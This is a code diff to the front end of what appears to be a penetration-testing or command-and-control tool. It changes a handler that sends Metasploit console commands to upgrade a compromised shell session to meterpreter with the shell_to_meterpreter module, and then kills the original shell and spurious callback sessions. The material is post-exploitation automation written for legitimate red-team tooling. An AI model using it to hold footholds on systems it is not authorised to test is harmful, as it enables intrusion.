@@ -5272,33 +5272,37 @@ export default function SessionDetail({ onLogout }: SessionDetailProps) {
                                   if (upgradingRef.current.has(s.id)) return;
                                   upgradingRef.current.add(s.id);
                                   await ensureMsfPrompt();
-                                  // Kill stale background handlers before upgrading.
-                                  // A leftover handler on the same port accepts callbacks from every
-                                  // interface on the target, creating spurious extra sessions.
-                                  await sendShellCmd('jobs -K');
                                   await sendShellCmd('use post/multi/manage/shell_to_meterpreter');
                                   await sendShellCmd(`set SESSION ${s.id}`);
                                   await sendShellCmd('run');
-                                  // Kill the original shell — the module always creates a new meterpreter
-                                  // session so the shell would otherwise remain alongside it.
-                                  await sendShellCmd(`sessions -k ${s.id}`);
-                                  // Give sessions a moment to finalise, then kill any newly-created
-                                  // sessions that have no Information field — these are spurious callbacks
-                                  // from alternate network interfaces on the target machine.
-                                  await new Promise(r => setTimeout(r, 1500));
+
+                                  // Wait for any meterpreter callbacks to register before inspecting.
+                                  await new Promise(r => setTimeout(r, 2000));
+
                                   try {
                                     const res = await axios.get(`/api/sessions/${sessionId}/msf-sessions`);
                                     const fresh = parseMsfSessions(res.data.output || '');
                                     const origId = parseInt(s.id, 10);
-                                    for (const fs of fresh) {
-                                      if (parseInt(fs.id, 10) > origId && !fs.info.trim()) {
-                                        await sendShellCmd(`sessions -k ${fs.id}`);
+
+                                    // Check whether the upgrade created at least one new meterpreter session.
+                                    const newSessions = fresh.filter(fs => parseInt(fs.id, 10) > origId);
+                                    const upgraded    = newSessions.some(fs => fs.type.startsWith('meterpreter'));
+
+                                    if (upgraded) {
+                                      // Success — kill the original shell, then remove any spurious sessions.
+                                      // Spurious sessions arise when the target is multi-homed: meterpreter
+                                      // calls back from every interface. The real session has an Information
+                                      // field (e.g. "master @ hv01"); spurious ones have an empty field.
+                                      await sendShellCmd(`sessions -k ${s.id}`);
+                                      for (const fs of newSessions) {
+                                        if (!fs.info.trim()) {
+                                          await sendShellCmd(`sessions -k ${fs.id}`);
+                                        }
                                       }
                                     }
-                                    setMsfSessions(fresh.filter(fs =>
-                                      parseInt(fs.id, 10) <= origId || !!fs.info.trim()
-                                    ));
+                                    // If upgrade failed (no new meterpreter), leave the original shell alive.
                                   } catch { /* best-effort */ }
+
                                   upgradingRef.current.delete(s.id);
                                   loadMsfSessions();
                                 }}
